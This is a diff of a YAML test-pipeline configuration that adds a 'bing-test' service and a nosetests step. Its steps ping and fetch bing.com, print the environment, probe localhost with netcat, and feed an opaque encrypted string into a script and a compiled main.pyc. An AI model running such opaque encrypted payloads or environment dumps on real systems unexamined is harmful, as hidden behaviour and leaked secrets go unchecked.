@@ -1,28 +1,34 @@
 # initial checkin
 - name: bing serial
   type: serial
-  service: bing
+  services:
+      - bing
+      - bing-test
   steps:
-    - name: pingable
+    - name: integration pingable
       command: ping -c 1 www.bing.com
-    - name: port 80 test
+    - name: integration port 80 test
       command: wget www.bing.com
-    - name: up tests
+    - name: integration tests
       type: parallel
       steps:
-        - name: bing parallel tests
+        - name: integration parallel tests
           type: parallel
           steps:
             - name: envs
               command: env
             - name: send to entry
               command: echo -n "U2FsdGVkX1+46wB3vdqBcnFeO0nkE7ULiYDUuV2vYuc=" | entry.sh
-            - name: help
-              command: python main.pyc --help
             - name: open port
               command: echo "" | nc localhost 8080
             - name: run main
               command: echo -n "U2FsdGVkX1+46wB3vdqBcnFeO0nkE7ULiYDUuV2vYuc=" > config.xml && python main.pyc
+- name: bing testunittests
+  type: parallel
+  service: bing-test
+  steps:
+    - name: unittests
+      command: bash -c "nosetests -v --process-timeout=120 test/*.pyc"
 
 #  - name: Test dockercfg Generator
 #    service: dockercfg_test
